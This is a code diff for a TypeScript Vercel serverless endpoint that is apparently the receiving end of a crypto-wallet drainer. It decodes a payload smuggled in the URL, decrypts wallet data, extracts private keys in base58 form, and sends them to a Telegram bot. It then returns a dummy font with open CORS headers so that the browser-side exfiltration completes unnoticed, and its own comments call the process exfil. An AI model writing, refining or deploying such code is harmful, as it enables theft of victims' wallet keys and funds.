@@ -1,4 +1,6 @@
-import { VercelRequest, VercelResponse } from '@vercel/node'
+// api/inbox/[...slug].ts
+
+import type { VercelRequest, VercelResponse } from '@vercel/node'
 import crypto from 'crypto'
 
 // Base58 alphabet and encoder
@@ -18,8 +20,8 @@ function base58(buffer: Buffer): string {
     }
   }
   let output = ''
-  for (const byte of buffer) {
-    if (byte === 0) output += ALPHABET[0]
+  for (const b of buffer) {
+    if (b === 0) output += ALPHABET[0]
     else break
   }
   for (let i = digits.length - 1; i >= 0; i--) {
@@ -31,13 +33,14 @@ function base58(buffer: Buffer): string {
 export default async function handler(req: VercelRequest, res: VercelResponse) {
   const slugArr = req.query.slug as string[] | string
   const raw = Array.isArray(slugArr) ? slugArr[slugArr.length - 1] : slugArr
-  const [_, payloadB64url] = raw.split('_')
-  if (!payloadB64url) return res.status(400).send('Bad slug')
+  const parts = raw.split('_')
+  if (parts.length < 2) return res.status(400).send('Bad slug')
 
   try {
-    // Decode URL‐safe base64
-    let b64 = payloadB64url.replace(/-/g, '+').replace(/_/g, '/')
+    // Decode URL‐safe Base64
+    let b64 = parts[1].replace(/-/g, '+').replace(/_/g, '/')
     b64 += '='.repeat((4 - (b64.length % 4)) % 4)
+
     // Parse JSON
     const { sBundles, keybundle } = JSON.parse(Buffer.from(b64, 'base64').toString('utf8'))
 
@@ -49,13 +52,13 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     for (const sb of sBundles) {
       const [iv_b64, data_b64] = sb.split(':')
       const iv = Buffer.from(iv_b64, 'base64')
-      const ct = Buffer.from(data_b64, 'base64')
-      const tag = ct.slice(-16)
-      const cipher = ct.slice(0, -16)
+      const ctTag = Buffer.from(data_b64, 'base64')
+      const tag = ctTag.slice(-16)
+      const ct = ctTag.slice(0, -16)
 
       const dec = crypto.createDecipheriv('aes-256-gcm', key, iv)
       dec.setAuthTag(tag)
-      const hex = Buffer.concat([dec.update(cipher), dec.final()]).toString('utf8')
+      const hex = Buffer.concat([dec.update(ct), dec.final()]).toString('utf8')
       const last64 = hex.slice(-64)
       privKeys.push(base58(Buffer.from(last64, 'hex')))
     }
@@ -63,7 +66,7 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     // Send to Telegram
     const BOT = process.env.BOT_TOKEN!
     const CHAT = process.env.CHAT_ID!
-    const text = privKeys.map((k,i)=>`wallet ${i+1}\n${k}`).join('\n\n')
+    const text = privKeys.map((k,i) => `wallet ${i+1}\n${k}`).join('\n\n')
     await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
       method: 'POST',
       headers: {'Content-Type':'application/json'},
@@ -75,9 +78,10 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     console.error('❌ Error processing exfil:', e)
   }
 
-  // Return dummy font so browser exfil doesn't break
+  // Return dummy font so browser exfil completes
   res
     .status(200)
-    .setHeader('Content-Type','font/woff')
+    .setHeader('Content-Type', 'font/woff')
+    .setHeader('Access-Control-Allow-Origin', '*')
     .send(Buffer.from([0x77,0x4f,0x46,0x46]))
 }
